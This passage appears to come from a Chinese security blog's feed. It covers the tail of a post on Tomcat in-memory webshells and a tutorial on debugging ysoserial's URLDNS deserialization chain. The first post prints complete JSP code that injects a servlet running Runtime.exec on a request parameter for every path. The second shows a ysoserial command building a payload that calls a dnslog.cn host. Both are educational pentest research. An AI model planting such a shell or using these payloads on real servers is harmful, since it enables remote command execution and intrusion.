punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在web.xml注册：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>servlet<span class="token punctuation">&gt;</span></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span><span class="token class-name">ServletShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span></span>Servlet<span class="token punctuation">.</span>ServletShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">&gt;</span><span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span><span class="token class-name">ServletShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">&gt;</span><span class="token comment">/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次在ContextConfig#webconfig打断点，此方法的主要作用在于读取web.xml以及其他配置操作，可以较为形象的跟踪servlet的读取过程。<br>查看调用栈：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">webConfig<span class="token operator">:</span><span class="token number">1264</span><span class="token punctuation">,</span> <span class="token class-name">ContextConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>startup<span class="token punctuation">)</span>configureStart<span class="token operator">:</span><span class="token number">986</span><span class="token punctuation">,</span> <span class="token class-name">ContextConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>startup<span class="token punctuation">)</span>lifecycleEvent<span class="token operator">:</span><span class="token number">303</span><span class="token punctuation">,</span> <span class="token class-name">ContextConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>startup<span class="token punctuation">)</span>fireLifecycleEvent<span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token class-name">LifecycleBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>util<span class="token punctuation">)</span>startInternal<span class="token operator">:</span><span class="token number">5135</span><span class="token punctuation">,</span> <span class="token class-name">StandardContext</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>start<span class="token operator">:</span><span class="token number">183</span><span class="token punctuation">,</span> <span class="token class-name">LifecycleBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>util<span class="token punctuation">)</span>addChildInternal<span class="token operator">:</span><span class="token number">726</span><span class="token punctuation">,</span> <span class="token class-name">ContainerBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>addChild<span class="token operator">:</span><span class="token number">698</span><span class="token punctuation">,</span> <span class="token class-name">ContainerBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>addChild<span class="token operator">:</span><span class="token number">696</span><span class="token punctuation">,</span> <span class="token class-name">StandardHost</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>manageApp<span class="token operator">:</span><span class="token number">1783</span><span class="token punctuation">,</span> <span class="token class-name">HostConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>startup<span class="token punctuation">)</span>invoke0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面的fireLifecycleEvent解析调用了web.xml内容</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">fireLifecycleEvent</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">LifecycleEvent</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LifecycleEvent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lifecycleListeners<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">LifecycleListener</span> listener <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LifecycleListener</span><span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        listener<span class="token punctuation">.</span><span class="token function">lifecycleEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而webconfig调用此解析内容进行配置，将内容通过configureContext来创建StandWrapper</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">configureContext</span><span class="token punctuation">(</span>webXml<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    webXml<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>tomcatWebXml<span class="token punctuation">)</span><span class="token punctuation">;</span>    webXml<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>defaults<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">convertJsps</span><span class="token punctuation">(</span>webXml<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">configureContext</span><span class="token punctuation">(</span>webXml<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在后面通过：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span>urlPattern<span class="token punctuation">,</span> jspServletName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行url路径的添加，因为加载顺序是Listener-&gt;Filter-&gt;Servlet，所以还要之间还要对Listener，Filter进行加载，到后由loadOnStartup加载之前的wrapper，其中有一个判断需要注意下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>loadOnStartup <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Integer</span> key <span class="token operator">=</span> loadOnStartup<span class="token punctuation">;</span>    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Wrapper</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>list <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说loadOnStartup大于等于0才会进行后续的操作（其实设置为0也不会进行），这个属性默认-1，表示启动的优先级，往后就成功加载了Servlet了。<br>其中configureContext在创建Wrapper时规定了几个必要的属性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LoadOnStartup</span>属性：wrapper<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getLoadOnStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ServletName</span>属性：wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ServletClass</span>属性：wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们加载的代码逻辑就在创建wrapper后，分别设置LoadOnStartup属性、ServletName属性以及ServletClass属性，最后通过addChild以及addServletMappingDecoded进行加载到对应路径，完整代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span> <span class="token string">"javax.servlet.ServletException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Wrapper"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>     <span class="token keyword">class</span> <span class="token class-name">ServletShell</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> command <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"servletshell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>         <span class="token annotation punctuation">@Override</span>         <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>             <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token class-name">ServletShell</span> shellservlet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> servletname <span class="token operator">=</span> shellservlet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Field</span> reqF <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reqF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Wrapper</span> wrappershell <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrappershell<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span>shellservlet<span class="token punctuation">)</span><span class="token punctuation">;</span>    wrappershell<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrappershell<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servletname<span class="token punctuation">)</span><span class="token punctuation">;</span>    wrappershell<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>shellservlet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrappershell<span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">,</span>servletname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>  这里只介绍了最基本的几种内存马，对于spring默认不解析jsp的有其他的利用方式，而且字节注入内存马和其他骚操作也有很广的利用场景，不少师傅也挖到了利用链，但在实战中写内存马一定要注意路径匹配问题，一旦把路由弄乱，影响测试方的正常业务，那就糟糕了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat内存马简析&quot;&gt;&lt;a href=&quot;#Tomcat内存马简析&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马简析&quot;&gt;&lt;/a&gt;Tomcat内存马简析&lt;/h1&gt;&lt;p&gt;  webshell木马配合webshell管理工具可以方便对于服务</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>URLDNS调试那些小事</title>
    <link href="https://rainsec.cn/post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html"/>
    <id>https://rainsec.cn/post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</id>
    <published>2022-03-26T10:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS调试那些小事"><a href="#URLDNS调试那些小事" class="headerlink" title="URLDNS调试那些小事"></a>URLDNS调试那些小事</h1><p>近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。</p><h4 id="ysoserial链接："><a href="#ysoserial链接：" class="headerlink" title="ysoserial链接："></a>ysoserial链接：</h4><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">下载地址: https://github.com/frohoff/ysoserial这里用jdk1.8来编译<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="编译ysoserial"><a href="#编译ysoserial" class="headerlink" title="编译ysoserial"></a>编译ysoserial</h4><p>用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。</p><p>下载好后进入GeneratePayload这个类</p><p>进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。</p><p>若运行成功后</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-1.png" alt="image-20220319164133435"></p><p>按下蓝色小闪电，然后package进行编译打包。</p><p>target目录下会显示编译好的jar包。</p><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>建立maven项目：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> bug <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">FileInputStream</span> inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"poc.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> oi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        oi<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oi<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"反序列化完成"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。</p><p>生成恶意poc：</p><p>在<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p>获得临时域名：0dt3fc.dnslog.cn</p><p> java -jar .\ysoserial-0.0.5-all.jar URLDNS “<a href="http://0dt3fc.dnslog.cn&quot;/">http://0dt3fc.dnslog.cn"</a> &gt; poc.ser</p><p>将poc.ser放在漏洞项目根目录运行即可。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-2.png" alt="image-20220319165349429"></p><p>注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：<br><a href="https://gitter.im/frohoff/ysoserial/archives/2017/09/18">https://gitter.im/frohoff/ysoserial/archives/2017/09/18</a></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。</p><p>在URLDNS.java下，作者写了如下利用链：</p><pre class="line-numbers language-none"><code class="language-none">*   Gadget Chain:*     HashMap.readObject()*       HashMap.putVal()*         HashMap.hash()*           URL.hashCode()*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在刚开始会new  HashMap()，</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-3.png" alt="image-20220319171527663"></p><p>接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-4.png" alt="image-20220319172033597"></p><p>值得关注key.hashCode()方法，</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-5.png" alt="image-20220319172118524"></p><p>当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）</p><p>这里调用getHostAddress</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-6.png" alt="image-20220319172245170"></p><p>他会进行dns的查询。</p><p>然后就是一些细节：</p><p>在Hashmap的readObject</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-7.png" alt="image-20220319172426593"></p><p>key是从readObject得到的，说明key应该在writeObject被写入了。</p><p>WriteObject最后会调用到internalWriteEntries(s)。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-8.png" alt="image-20220319172535442"></p><p>从中可看出，key和value都来自table，即HashMap中table的值。</p><p>要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-9.png" alt="img"></p><p>这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，</p><p>可以直接返回NULL，不会有后续的操作，从而不会dns请求。</p><p>知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。</p><p>参考：</p><p><a href="https://www.yuque.com/pmiaowu/gpy1q8/ygthda">https://www.yuque.com/pmiaowu/gpy1q8/ygthda</a></p><p><a href="https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc</a></p><p><a href="https://xz.aliyun.com/t/7157?page=5">https://xz.aliyun.com/t/7157?page=5</a></p>]]></content>
    
    
      
      
